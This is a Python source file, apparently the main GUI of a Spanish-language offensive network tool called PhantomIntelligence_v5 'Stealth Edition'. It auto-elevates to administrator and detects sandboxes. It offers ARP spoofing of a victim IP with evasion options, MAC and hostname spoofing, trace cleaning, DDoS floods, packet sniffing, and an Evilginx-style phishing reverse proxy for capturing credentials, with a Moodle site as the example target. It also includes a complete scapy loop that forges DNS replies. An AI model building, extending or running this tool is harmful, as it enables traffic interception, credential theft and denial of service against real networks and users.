"""
PhantomIntelligence_v5 - Herramienta de red avanzada con CustomTkinter.
Arquitectura modular separada en funciones y módulos de soporte.
"""

import customtkinter as ctk
from tkinter import messagebox, filedialog
import threading
import time
import os
import sys
import ctypes
import ipaddress

# Importar módulos de soporte
from modulos.config import *
from modulos.ui_helpers import *
from modulos.network_core import *
from modulos.system_utils import _auto_elevate, _restart_admin, _is_admin, is_sandbox
from modulos.logger_engine import LoggerEngine

# Auto-elevación de privilegios al inicio
# (si no somos admin, lanza proceso elevado y termina INMEDIATAMENTE)
_auto_elevate()

# Inicializar variables globales con valores rápidos y actualizar config
MAC = _mac_propia()          # Rápido (uuid)
GATEWAY = "—"               # Se actualiza en background
IP_LOCAL = "127.0.0.1"      # Se actualiza en background
DIR_BASE = os.path.dirname(os.path.abspath(__file__))

import modulos.config as config
config.MAC = MAC
config.GATEWAY = GATEWAY
config.IP_LOCAL = IP_LOCAL
config.DIR_BASE = DIR_BASE

# Importar módulos de funciones
from funciones.ghost import GhostModule
from funciones.arp import ARPModule
from funciones.mac import MACModule
from funciones.scanner import ScannerModule
from funciones.ddos import DDOSModule
from funciones.sniffer import SnifferModule
from funciones.universal_proxy import UniversalProxyModule
from funciones.veyon import VeyonModule

# Dependencias opcionales
try:
    from scapy.all import conf
    SCAPY_OK = True
except Exception:
    SCAPY_OK = False

try:
    import psutil
    PSUTIL_OK = True
except Exception:
    PSUTIL_OK = False

# Tema global
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

def _init_network_bg():
    """Inicializa variables de red en background para no bloquear el arranque."""
    global GATEWAY, IP_LOCAL
    gw = _gateway()
    ip = _ip_local()
    GATEWAY = gw
    IP_LOCAL = ip
    config.GATEWAY = gw
    config.IP_LOCAL = ip

import threading as _t_net
_t_net.Thread(target=_init_network_bg, daemon=True).start()

class PinguExit:
    """Aplicación principal de PhantomIntelligence_v5."""
    
    def __init__(self, root: ctk.CTk):
        self.root = root
        self.root.title("PhantomIntelligence_v5 - Stealth Edition")
        self.root.geometry("860x720")
        self.root.minsize(760, 600)
        
        # Asegurarse de que las funciones del sistema estén disponibles
        import modulos.system_utils
        self._is_admin = modulos.system_utils._is_admin
        self._auto_elevate = modulos.system_utils._auto_elevate
        self._restart_admin_func = modulos.system_utils._restart_admin
        
        # Inicializar motor de logging
        self.logger_engine = LoggerEngine()
        
        # Inicializar módulos
        self.ghost_module = GhostModule(self.logger_engine)
        self.arp_module = ARPModule(self.logger_engine)
        self.mac_module = MACModule(self.logger_engine)
        self.scanner_module = ScannerModule(self.logger_engine)
        self.ddos_module = DDOSModule(self.logger_engine)
        self.sniffer_module = SnifferModule(self.logger_engine)
        self.proxy_module = UniversalProxyModule(self.logger_engine)
        self.veyon_module = VeyonModule(self.logger_engine)
        
        # Variables de UI
        self._init_ui_vars()
        
        # Construir UI
        self._ui()
        
        # Iniciar bucle de vaciado de colas
        self._flush_loop()
        
        if is_sandbox():
            self.logger_engine.log("¡ADVERTENCIA: Entorno Sandbox / VM detectado! Algunas características nativas podrían fallar.", "warn")
            self.logger_engine.write(self.consola, "\n[!] PRECAUCIÓN: Entorno Sandbox o Máquina Virtual detectado.\n[!] El comportamiento de la red estará filtrado por el hipervisor.\n\n")
        
        # Validar Npcap/Scapy al inicio
        if not SCAPY_OK:
            self.root.after(400, self._check_npcap)
        
        # Cargar claves Veyon al inicio
        self.root.after(600, self._vey_recargar_claves)
    
    def _init_ui_vars(self):
        """Inicializa variables de UI."""
        self._claves_pem: list[str] = []
        self._clave_sel: str | None = None
        
        # Inicializar widgets como None para evitar AttributeError
        self.nb = None
        self.consola = None
        self.arp_ip = None
        self.arp_gw = None
        self.arp_int = None
        self.arp_stealth = None
        self.arp_jitter = None
        self.arp_oui_var = None
        self.arp_start_btn = None
        self.arp_stop_btn = None
        self.arp_out = None
        self.mac_iface = None
        self.mac_nueva = None
        self.mac_oui = None
        self.mac_out = None
        self.scan_rango = None
        self.scan_timeout = None
        self.scan_btn = None
        self.scan_out = None
        self.ddos_ip = None
        self.ddos_pto = None
        self.ddos_modo = None
        self.ddos_start_btn = None
        self.ddos_stop_btn = None
        self.ddos_out = None
        self.sniff_filtro = None
        self.sniff_start_btn = None
        self.sniff_stop_btn = None
        self.sniff_count = None
        self.sniff_out = None
        self.dns_dom = None
        self.dns_falsa = None
        self.dns_reglas_box = None
        self.dns_start_btn = None
        self.dns_stop_btn = None
        self.dns_out = None
        self.cap_out = None
        self.cap_server_btn = None
        self.cap_stop_btn = None
        self.cap_proxy_btn = None
        self.cap_phishlet_var = None
        self.cap_target = None  # Nuevo input de URL proxy
        self.vey_clave_var = None
        self.vey_clave_menu = None
        self.vey_out = None
        self.wol_mac = None
        self.ghost_hostname = None
        self.ghost_out = None
    
    def _write(self, widget, text):
        """Escribe en un widget usando el motor de logging."""
        self.logger_engine.write(widget, text)
    
    def _log(self, msg: str, tipo: str = "info"):
        """Añade mensaje al log global."""
        self.logger_engine.log(msg, tipo)
    
    def _ui(self):
        """Construye la interfaz de usuario."""
        # Barra superior
        top = ctk.CTkFrame(self.root, height=46, corner_radius=0, fg_color="#080808")
        top.pack(fill="x")
        top.pack_propagate(False)
        
        ctk.CTkLabel(top, text=" ⚡ PhantomIntelligence_v5 - Stealth Edition",
                     font=ctk.CTkFont(size=18, weight="bold"),
                     text_color="#4fc3f7").pack(side="left", padx=12)
        
        right_frame = ctk.CTkFrame(top, fg_color="transparent")
        right_frame.pack(side="right", fill="y")
        
        if not self._is_admin():
            self._btn(right_frame, "🛡️ Reiniciar como Admin", self._restart_admin, "#b71c1c", width=140, height=28).pack(side="left", padx=(0, 15), pady=9)
        
        ctk.CTkLabel(right_frame,
                     text=f"GW: {GATEWAY}   IP: {IP_LOCAL}   MAC: {MAC}",
                     font=ctk.CTkFont(size=10), text_color="#3a3a3a"
                     ).pack(side="left", padx=14)
        
        # Pestañas
        self.nb = ctk.CTkTabview(
            self.root, corner_radius=8,
            fg_color="#141414",
            segmented_button_fg_color="#0d0d0d",
            segmented_button_selected_color="#0d47a1",
            segmented_button_unselected_color="#0d0d0d",
            segmented_button_selected_hover_color="#1565c0",
            text_color="#9e9e9e",
            text_color_disabled="#444444",
        )
        self.nb.pack(fill="both", expand=True, padx=12, pady=(8, 0))
        
        tabs = [
            ("👻 GHOST",        self._build_ghost),
            ("⚡ ARP",          self._build_arp),
            ("🎭 MAC",          self._build_mac),
            ("🔍 Escáner",      self._build_scanner),
            ("💥 DDoS",         self._build_ddos),
            ("📡 Sniffer",      self._build_sniffer),
            ("🌐 DNS/CAPTURA",  self._build_dns),
            ("🖥 Veyon",        self._build_veyon),
        ]
        for nombre, fn in tabs:
            self.nb.add(nombre)
            fn(self.nb.tab(nombre))
        
        # Consola global
        bar = ctk.CTkFrame(self.root, height=24, corner_radius=0, fg_color="#0d0d0d")
        bar.pack(fill="x")
        bar.pack_propagate(False)
        ctk.CTkLabel(bar, text=" REGISTRO GLOBAL",
                     font=ctk.CTkFont(size=10, weight="bold"),
                     text_color="#3a3a3a").pack(side="left", padx=8)
        ctk.CTkButton(bar, text="Limpiar", width=60, height=18,
                      font=ctk.CTkFont(size=10),
                      fg_color="#1a1a1a", hover_color="#252525",
                      command=lambda: self.consola.delete("1.0", "end")
                      ).pack(side="right", padx=8, pady=3)
        
        self.consola = _out(self.root, 8)
        self.consola.pack(fill="x", padx=12, pady=(0, 10))
        
        # Tags de color para la consola
        for tag, color in COL.items():
            self.consola.tag_config(tag, foreground=color)
        
        self._log("[*] PhantomIntelligence_v5 listo.", "ok")
        if not self._is_admin():
            self._log("[!] ATENCIÓN: Funciones ocultas desactivadas sin modo Administrador.", "warn")
        if not SCAPY_OK:
            self._log("[!] Scapy no disponible — instala Npcap: https://npcap.com/#download", "err")
    
    def _btn(self, parent, text, cmd, color="#1565c0", **kw):
        """Botón estándar."""
        return _btn(parent, text, cmd, color, **kw)
    
    def _flush_loop(self):
        """Bucle de vaciado de colas."""
        self.logger_engine.flush_queues(self.root, self.consola, self.sniff_count)
        self.root.after(80, self._flush_loop)
    
    def _restart_admin(self):
        """Reinicia como administrador."""
        try:
            self._restart_admin_func()
            self.root.destroy()
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo elevar privilegios: {e}", parent=self.root)
    
    def _npcap_warn(self):
        """Muestra advertencia de Npcap/Scapy."""
        messagebox.showerror("Npcap/Scapy requerido",
            "Scapy o Npcap no están instalados.\n\n"
            "1) Ejecuta en consola: pip install scapy\n"
            "2) Descarga Npcap: https://npcap.com/#download\n"
            "   (Activa 'WinPcap API-compatible mode' al instalar).",
            parent=self.root)
    
    # Métodos de construcción de pestañas (simplificados)
    def _build_ghost(self, p):
        """Construye la pestaña GHOST."""
        _pad(p)
        ctk.CTkLabel(p, text="GHOST — Ocultación y Evasión Avanzada",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))
        
        self.ghost_hostname = _campo(p, "Nuevo Hostname:", "Ej: DESKTOP-X1Y2Z3")
        
        bf = _btn_row(p)
        self._btn(bf, "🎭 Spoofear Hostname", self._ghost_spoof_hostname, "#e65100").pack(side="left", padx=(0,10))
        self._btn(bf, "🐧 Emular TTL (Linux)", self._ghost_emulate_ttl, "#2e7d32").pack(side="left", padx=(0,10))
        self._btn(bf, "🧹 Limpiar Rastros Red", self._ghost_clean_traces, "#b71c1c").pack(side="left", padx=(0,10))
        self._btn(bf, "🔄 Restaurar Originales", self._ghost_restore, "#01579b").pack(side="left")
        
        _sep(p)
        self.ghost_out = _out(p, 10)
    
    def _ghost_spoof_hostname(self):
        """Manejador de spoofing de hostname."""
        nuevo_nombre = self.ghost_hostname.get().strip()
        if not nuevo_nombre:
            messagebox.showwarning("Aviso", "Introduce un nuevo nombre de host.")
            return
        self.ghost_module.spoof_hostname(nuevo_nombre, lambda txt: self._write(self.ghost_out, txt))
    
    def _ghost_emulate_ttl(self):
        """Manejador de emulación de TTL."""
        self.ghost_module.emulate_ttl(lambda txt: self._write(self.ghost_out, txt))
    
    def _ghost_clean_traces(self):
        """Manejador de limpieza de rastros."""
        self.ghost_module.clean_traces(lambda txt: self._write(self.ghost_out, txt))
    
    def _ghost_restore(self):
        """Restaura el hostname y TTL originales guardados al inicio del programa."""
        self.ghost_module.restore_ghost(lambda txt: self._write(self.ghost_out, txt))
    
    def _check_npcap(self):
        """Alerta al usuario si Npcap/Scapy no está instalado."""
        resp = messagebox.askokcancel(
            "⚠️ Npcap no detectado",
            "Scapy o Npcap no están instalados correctamente.\n\n"
            "Sin Npcap, las siguientes funciones NO funcionarán:\n"
            "  • ARP Spoofing\n  • Escáner de red\n"
            "  • DDoS (SYN/UDP/Ping Flood)\n  • Sniffer\n  • DNS Spoofing\n\n"
            "¿Abrir la página de descarga de Npcap ahora?",
            parent=self.root
        )
        if resp:
            import webbrowser
            webbrowser.open("https://npcap.com/#download")
    
    def _build_arp(self, p):
        """Construye la pestaña ARP."""
        _pad(p)
        ctk.CTkLabel(p, text="ARP Spoofing — Intercepción de tráfico",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))
        
        self.arp_ip = _campo(p, "IP víctima:", "Ej: 192.168.1.50")
        self.arp_gw = _campo(p, "Gateway (vacío=auto):", valor=GATEWAY)
        self.arp_int = _campo(p, "Intervalo base (s):", valor="2", width=80)
        
        # Opciones de evasión
        opts = ctk.CTkFrame(p, fg_color="#111111", corner_radius=6)
        opts.pack(fill="x", pady=6)
        ctk.CTkLabel(opts, text="  Opciones de evasión",
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color="#455a64").pack(anchor="w", padx=8, pady=(6,2))
        
        orow = ctk.CTkFrame(opts, fg_color="transparent")
        orow.pack(fill="x", pady=(0,8), padx=8)
        self.arp_stealth = ctk.BooleanVar(value=True)
        self.arp_jitter = ctk.BooleanVar(value=True)
        self.arp_oui_var = ctk.StringVar(value="Ninguno")
        
        ctk.CTkSwitch(orow, text="Rate Limiting dinámico",
                      variable=self.arp_stealth,
                      font=ctk.CTkFont(size=12)).pack(side="left", padx=(0,16))
        ctk.CTkSwitch(orow, text="Jitter aleatorio",
                      variable=self.arp_jitter,
                      font=ctk.CTkFont(size=12)).pack(side="left", padx=(0,16))
        
        orow2 = ctk.CTkFrame(opts, fg_color="transparent")
        orow2.pack(fill="x", pady=(0,8), padx=8)
        ctk.CTkLabel(orow2, text="Spoofear fabricante MAC:",
                     font=ctk.CTkFont(size=12)).pack(side="left", padx=(0,8))
        ctk.CTkOptionMenu(orow2, values=["Ninguno","Apple","Samsung","Genérico"],
                          variable=self.arp_oui_var, width=130,
                          fg_color="#1a1a1a", button_color="#1565c0",
                          font=ctk.CTkFont(size=12)).pack(side="left")
        
        bf = _btn_row(p)
        self.arp_start_btn = self._btn(bf, "▶ Iniciar ARP Spoof", self._arp_start, "#c62828")
        self.arp_start_btn.pack(side="left", padx=(0,10))
        self.arp_stop_btn = self._btn(bf, "■ Detener + Restaurar", self._arp_stop, "#37474f")
        self.arp_stop_btn.configure(state="disabled")
        self.arp_stop_btn.pack(side="left")
        
        _sep(p)
        self.arp_out = _out(p, 7)
    
    def _arp_start(self):
        """Inicia ataque ARP."""
        if not SCAPY_OK:
            self._npcap_warn()
            return
        
        ip = self.arp_ip.get().strip()
        if not ip:
            messagebox.showwarning("Aviso", "Introduce la IP de la víctima.")
            return
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            messagebox.showwarning("Error de Entrada", "La IP de la víctima no tiene un formato válido.")
            return
        
        gw = self.arp_gw.get().strip() or GATEWAY
        if gw:
            try:
                ipaddress.ip_address(gw)
            except ValueError:
                messagebox.showwarning("Error de Entrada", "La IP del Gateway no tiene un formato válido.")
                return
        
        interval = float(self.arp_int.get() or 2)
        oui = self.arp_oui_var.get().lower()
        
        if self.arp_module.start_attack(ip, gw, interval, self.arp_stealth.get(), self.arp_jitter.get(), oui, 
                                       lambda txt: self._write(self.arp_out, txt), self._arp_stop):
            self.arp_start_btn.configure(state="disabled", fg_color="#37474f")
            self.arp_stop_btn.configure(state="normal", fg_color="#c62828")
            self.arp_out.delete("1.0", "end")
    
    def _arp_stop(self):
        """Detiene ataque ARP."""
        self.arp_module.stop_attack(lambda txt: self._write(self.arp_out, txt))
        self.arp_start_btn.configure(state="normal", fg_color="#c62828")
        self.arp_stop_btn.configure(state="disabled", fg_color="#37474f")
    
    def _build_mac(self, p):
        """Construye la pestaña MAC."""
        _pad(p)
        ctk.CTkLabel(p, text="MAC Spoofing — Cambio de identidad de red",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))
        
        self.mac_iface = _campo(p, "Interfaz:", valor="Ethernet" if os.name == "nt" else "eth0")
        self.mac_nueva = _campo(p, "Nueva MAC (manual/gen.):", placeholder="AA:BB:CC:DD:EE:FF")
        
        oui_row = ctk.CTkFrame(p, fg_color="transparent")
        oui_row.pack(fill="x", pady=3)
        ctk.CTkLabel(oui_row, text="Generar MAC (Ejemplos):", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        self.mac_oui = ctk.StringVar(value="Aleatorio")
        ctk.CTkOptionMenu(oui_row, values=["Aleatorio","Apple","Samsung","Genérico"],
                          variable=self.mac_oui, width=130,
                          fg_color="#1a1a1a", button_color="#1565c0",
                          font=ctk.CTkFont(size=12)).pack(side="left")
        
        def _generar_mac():
            oui = self.mac_oui.get().lower()
            nueva = self.mac_module.generate_random_mac(oui if oui != "aleatorio" else None)
            self.mac_nueva.delete(0, "end")
            self.mac_nueva.insert(0, nueva.upper())
        
        self._btn(oui_row, "Generar", _generar_mac, "#2e7d32", width=70).pack(side="left", padx=10)
        
        bf = _btn_row(p)
        self._btn(bf, "Aplicar MAC", self._mac_aplicar, "#e65100").pack(side="left", padx=(0,10))
        self._btn(bf, "📋 Listar Interfaces", self._mac_listar, "#1565c0").pack(side="left", padx=(0,10))
        self._btn(bf, "MAC propia", lambda: self._log(f"[MAC] Original: {MAC}", "info"), "#37474f").pack(side="left")
        
        _sep(p)
        self.mac_out = _out(p, 10)
    
    def _mac_aplicar(self):
        """Aplica cambio de MAC con advertencias."""
        iface = self.mac_iface.get().strip()
        oui = self.mac_oui.get().lower()
        nueva = (self.mac_nueva.get().strip() or self.mac_module.generate_random_mac(oui if oui != "aleatorio" else None)).upper()
        
        self.mac_out.delete("1.0", "end")
        self.mac_module.apply_mac_change(iface, nueva, lambda txt: self._write(self.mac_out, txt))
    
    def _mac_listar(self):
        """Lista interfaces de red disponibles usando el nuevo motor."""
        self.mac_out.delete("1.0", "end")
        self._write(self.mac_out, "» Escaneando interfaces de red (ipconfig /all)...\n")
        self._write(self.mac_out, "─"*48 + "\n")
        self.mac_module.find_interfaces(write_callback=lambda txt: self._write(self.mac_out, txt))
        self._write(self.mac_out, "─"*48 + "\n")
        self._write(self.mac_out, "✓ Usa el nombre exacto de la interfaz en el campo superior.\n")

    def _build_scanner(self, p):
        """Construye la pestaña Escáner."""
        _pad(p)
        ctk.CTkLabel(p, text="Escáner LAN — Descubrimiento de dispositivos",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))
        
        rango_def = self.scanner_module.get_default_range()
        self.scan_rango = _campo(p, "Rango de red:", valor=rango_def, width=220)
        self.scan_timeout = _campo(p, "Timeout (s):", valor="3", width=60)
        
        bf = _btn_row(p)
        self.scan_btn = self._btn(bf, "🔍 Escanear red", self._scan_start, "#00695c")
        self.scan_btn.pack(side="left")
        
        _sep(p)
        ctk.CTkLabel(p, text=f"{'IP':<20}  {'MAC':<20}  Fabricante / Rol",
                     font=ctk.CTkFont(family="Consolas", size=11),
                     text_color="#37474f").pack(anchor="w")
        self.scan_out = _out(p, 14)
    
    def _scan_start(self):
        """Inicia escaneo de red."""
        if not SCAPY_OK:
            self._npcap_warn()
            return
        
        rango = self.scan_rango.get().strip()
        try:
            timeout = int(self.scan_timeout.get())
        except ValueError:
            timeout = 3
        
        self.scan_btn.configure(state="disabled", text="Escaneando…")
        if self.scanner_module.scan_network(rango, timeout, lambda txt: self._write(self.scan_out, txt), 
                                           lambda: self.scan_btn.configure(state="normal", text="🔍 Escanear red")):
            self.scan_out.delete("1.0", "end")
    
    def _build_ddos(self, p):
        """Construye la pestaña DDoS."""
        _pad(p)
        ctk.CTkLabel(p, text="DDoS Local — Denegación de servicio en LAN",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))
        
        self.ddos_ip = _campo(p, "IP objetivo:", "192.168.1.XX")
        self.ddos_pto = _campo(p, "Puerto:", valor="80", width=70)
        self.ddos_threads = _campo(p, "Hilos (Multi-thread):", valor="50", width=70)
        
        mode_row = ctk.CTkFrame(p, fg_color="transparent")
        mode_row.pack(fill="x", pady=3)
        ctk.CTkLabel(mode_row, text="Modo:", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        self.ddos_modo = ctk.StringVar(value="SYN Flood")
        ctk.CTkOptionMenu(mode_row, values=["SYN Flood","Ping Flood","UDP Flood","HTTP GET Flood", "HTTP POST Flood"],
                          variable=self.ddos_modo, width=150,
                          fg_color="#1a1a1a", button_color="#1565c0",
                          font=ctk.CTkFont(size=12)).pack(side="left")
        
        self.ddos_ua_rot = ctk.BooleanVar(value=True)
        ctk.CTkSwitch(mode_row, text="Rotación U-A", variable=self.ddos_ua_rot, font=ctk.CTkFont(size=11)).pack(side="left", padx=15)
        
        bf = _btn_row(p)
        self.ddos_start_btn = self._btn(bf, "▶ Lanzar DDoS", self._ddos_start, "#b71c1c")
        self.ddos_start_btn.pack(side="left", padx=(0,10))
        self.ddos_stop_btn = self._btn(bf, "■ Detener", self._ddos_stop, "#37474f")
        self.ddos_stop_btn.configure(state="disabled")
        self.ddos_stop_btn.pack(side="left")
        
        _sep(p)
        self.ddos_out = _out(p, 8)
    
    def _ddos_start(self):
        """Inicia ataque DDoS."""
        modo = self.ddos_modo.get()
        needs_scapy = modo not in ["HTTP GET Flood", "HTTP POST Flood"]
        if needs_scapy and not SCAPY_OK:
            self._npcap_warn()
            return
        
        ip = self.ddos_ip.get().strip()
        if not ip:
            messagebox.showwarning("Aviso", "Introduce la IP del objetivo.")
            return
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            messagebox.showwarning("Error de Entrada", "La IP objetivo no tiene un formato válido.")
            return
        
        try:
            pto = int(self.ddos_pto.get())
            if not (1 <= pto <= 65535):
                raise ValueError()
        except ValueError:
            messagebox.showwarning("Error de Entrada", "El puerto debe ser un número entero entre 1 y 65535.")
            return
        
        try:
            threads = int(self.ddos_threads.get())
            if not (1 <= threads <= 1000):
                raise ValueError()
        except ValueError:
            messagebox.showwarning("Error de Entrada", "Hilos: entero 1 a 1000.")
            return

        use_ua = self.ddos_ua_rot.get()
        modo = self.ddos_modo.get()
        
        if self.ddos_module.start_attack(ip, pto, modo, threads, use_ua, lambda txt: self._write(self.ddos_out, txt), self._ddos_stop):
            self.ddos_start_btn.configure(state="disabled", fg_color="#37474f")
            self.ddos_stop_btn.configure(state="normal", fg_color="#b71c1c")
            self.ddos_out.delete("1.0", "end")
    
    def _ddos_stop(self):
        """Detiene ataque DDoS."""
        self.ddos_module.stop_attack(lambda txt: self._write(self.ddos_out, txt))
        self.ddos_start_btn.configure(state="normal", fg_color="#b71c1c")
        self.ddos_stop_btn.configure(state="disabled", fg_color="#37474f")
    
    def _build_sniffer(self, p):
        """Construye la pestaña Sniffer."""
        _pad(p)
        ctk.CTkLabel(p, text="Sniffer — Captura de paquetes en tiempo real",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))
        
        self.sniff_filtro = _campo(p, "Filtro BPF (vacío=todo):", "ej: tcp port 80  |  udp port 53", width=280)
        
        presets_row = ctk.CTkFrame(p, fg_color="transparent")
        presets_row.pack(fill="x", pady=(0,6))
        ctk.CTkLabel(presets_row, text="Presets:", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        for label, flt in [("HTTP","tcp port 80"),("DNS","udp port 53"),("HTTPS","tcp port 443"),("ARP","arp"),("Todo","")]:
            self._btn(presets_row, label, lambda f=flt: self._sniff_preset(f), "#1a237e", width=62).pack(side="left", padx=2)
        
        bf = _btn_row(p)
        self.sniff_start_btn = self._btn(bf, "▶ Iniciar captura", self._sniff_start, "#6a1b9a")
        self.sniff_start_btn.pack(side="left", padx=(0,10))
        self.sniff_stop_btn = self._btn(bf, "■ Detener", self._sniff_stop, "#37474f")
        self.sniff_stop_btn.configure(state="disabled")
        self.sniff_stop_btn.pack(side="left")
        self.sniff_count = ctk.CTkLabel(bf, text="0 pkts", font=ctk.CTkFont(size=11), text_color="#555555")
        self.sniff_count.pack(side="right", padx=10)
        
        _sep(p)
        self.sniff_out = _out(p, 12)
        self.logger_engine.reset_sniff_count()
    
    def _sniff_preset(self, flt):
        """Aplica preset de filtro."""
        self.sniff_filtro.delete(0, "end")
        if flt:
            self.sniff_filtro.insert(0, flt)
    
    def _sniff_start(self):
        """Inicia captura de paquetes."""
        if not SCAPY_OK:
            self._npcap_warn()
            return
        
        filtro = self.sniff_filtro.get().strip()
        self.logger_engine.reset_sniff_count()
        
        if self.sniffer_module.start_capture(filtro, lambda txt: self._write(self.sniff_out, txt), 
                                            lambda count: self._sniff_stop(count)):
            self.sniff_start_btn.configure(state="disabled", fg_color="#37474f")
            self.sniff_stop_btn.configure(state="normal", fg_color="#6a1b9a")
            self.sniff_out.delete("1.0", "end")
            self._write(self.sniff_out, f"» Capturando — filtro: '{filtro or 'cualquier paquete'}'\n" + "─"*48 + "\n")
            self._log(f"[SNIFF] Iniciado. Filtro: '{filtro or 'ninguno'}'", "info")
    
    def _sniff_stop(self, packet_count=0):
        """Detiene captura de paquetes."""
        self.sniffer_module.stop_capture(lambda txt: self._write(self.sniff_out, txt), packet_count)
        self.sniff_start_btn.configure(state="normal", fg_color="#6a1b9a")
        self.sniff_stop_btn.configure(state="disabled", fg_color="#37474f")
    
    def _build_dns(self, p):
        """Construye la pestaña DNS/CAPTURA."""
        _pad(p)
        ctk.CTkLabel(p, text="DNS Spoofing — Redirección de tráfico web",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))
        
        self.dns_dom = _campo(p, "Dominio a interceptar:", "ej: google.com")
        self.dns_falsa = _campo(p, "IP falsa (tu IP):", valor=IP_LOCAL)
        
        bf0 = _btn_row(p, pady=3)
        self._btn(bf0, "+ Añadir regla", self._dns_add, "#1b5e20").pack(side="left", padx=(0,8))
        self._btn(bf0, "✕ Limpiar reglas", self._dns_clear, "#37474f").pack(side="left")
        
        self.dns_reglas_box = _out(p, 3)
        self.dns_reglas_box.insert("end", "── Reglas DNS activas ──\n")
        
        bf = _btn_row(p)
        self.dns_start_btn = self._btn(bf, "▶ Activar DNS Spoof", self._dns_start, "#e65100")
        self.dns_start_btn.pack(side="left", padx=(0,10))
        self.dns_stop_btn = self._btn(bf, "■ Desactivar", self._dns_stop, "#37474f")
        self.dns_stop_btn.configure(state="disabled")
        self.dns_stop_btn.pack(side="left")
        
        _sep(p)
        
        # Sección CAPTURA DE CREDENCIALES
        ctk.CTkLabel(p, text="Reverse Proxy Dinámico (Evilginx2 Style)",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#b71c1c").pack(anchor="w", padx=4, pady=(0,4))
        
        info_lbl = ctk.CTkLabel(p, text=f"Servidor escucha en puerto 80  |  IP local: {IP_LOCAL}",
                               font=ctk.CTkFont(size=11), text_color="#455a64")
        info_lbl.pack(anchor="w", padx=4, pady=(0,6))
        
        self.cap_target = _campo(p, "URL Real a clonar/interceptar:", "Ej: https://moodle.ejemplo.com", width=280)
        
        phish_row = ctk.CTkFrame(p, fg_color="transparent")
        phish_row.pack(fill="x", pady=4)
        ctk.CTkLabel(phish_row, text="Phishlet (Plantilla):", width=160, anchor="w", font=ctk.CTkFont(size=12)).pack(side="left")
        
        # Obtener phishlets disponibles
        phishlets = self.proxy_module.get_available_phishlets() or ["Ninguno"]
        self.cap_phishlet_var = ctk.StringVar(value=phishlets[0])
        ctk.CTkOptionMenu(phish_row, values=phishlets, variable=self.cap_phishlet_var, width=150,
                          fg_color="#111111", button_color="#880e4f", font=ctk.CTkFont(size=12)).pack(side="left")
        
        bf_cap = _btn_row(p, pady=4)
        self.cap_proxy_btn = self._btn(bf_cap, "🎓 Activar Proxy Dinámico (Auto DNS+HTTP)", self._cap_proxy_dinamico, "#4a148c")
        self.cap_proxy_btn.pack(side="left", padx=(0,10))
        
        self.cap_stop_btn = self._btn(bf_cap, "■ Detener Servidor", self._cap_stop, "#37474f")
        self.cap_stop_btn.configure(state="disabled")
        self.cap_stop_btn.pack(side="left")
        
        self.cap_out = _out(p, 5)
        self.dns_out = self.cap_out
    
    def _dns_add(self):
        """Añade regla DNS."""
        dom = self.dns_dom.get().strip()
        ip_f = self.dns_falsa.get().strip()
        if dom and ip_f:
            _dns_reglas[dom] = ip_f
            self._write(self.dns_reglas_box, f"  {dom:<30} → {ip_f}\n")
            self.dns_dom.delete(0, "end")
            self._log(f"[DNS] Regla: {dom} → {ip_f}", "ok")
    
    def _dns_clear(self):
        """Limpia reglas DNS."""
        self.dns_reglas_box.delete("2.0", "end")
        _dns_reglas.clear()
        self._log("[DNS] Reglas borradas.", "warn")
    
    def _dns_start(self):
        """Inicia DNS Spoofing."""
        if not SCAPY_OK:
            self._npcap_warn()
            return
        
        if not _dns_reglas:
            messagebox.showwarning("Sin reglas", "Añade al menos una regla DNS primero.")
            return
        
        _estado["dns"].set()
        self.dns_start_btn.configure(state="disabled", fg_color="#37474f")
        self.dns_stop_btn.configure(state="normal", fg_color="#e65100")
        self._write(self.cap_out, f"» DNS Spoofing activo — {len(_dns_reglas)} regla(s)\n" + "─"*44 + "\n")
        self._log("[DNS] Spoofing activado.", "warn")
        threading.Thread(target=self._dns_loop, daemon=True).start()
    
    def _dns_stop(self):
        """Detiene DNS Spoofing."""
        _estado["dns"].clear()
        self.dns_start_btn.configure(state="normal", fg_color="#e65100")
        self.dns_stop_btn.configure(state="disabled", fg_color="#37474f")
        self._write(self.cap_out, "● DNS Spoofing desactivado.\n")
        self._log("[DNS] Desactivado.", "warn")
    
    def _dns_loop(self):
        """Loop de DNS spoofing."""
        try:
            from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff
        except ImportError:
            return
        
        def proc(pkt):
            if not _estado["dns"].is_set(): 
                return
            if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0): 
                return
            nombre = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            for dom, ip_f in _dns_reglas.items():
                if dom in nombre:
                    resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                            UDP(dport=pkt[UDP].sport, sport=53) /
                            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=ip_f)))
                    send(resp, verbose=0)
                    msg = f"  ↬ {nombre:<35} → {ip_f}\n"
                    self._write(self.cap_out, msg)
                    self._log(f"[DNS] {nombre} → {ip_f}", "pkt")
                    return
        
        try:
            sniff(filter="udp port 53", prn=proc,
                  stop_filter=lambda _: not _estado["dns"].is_set(), store=False)
        except Exception as e:
            self._write(self.cap_out, f"✗ Error: {e}\n")
            self._log(f"[DNS] Error: {e}", "err")
        finally:
            _estado["dns"].clear()
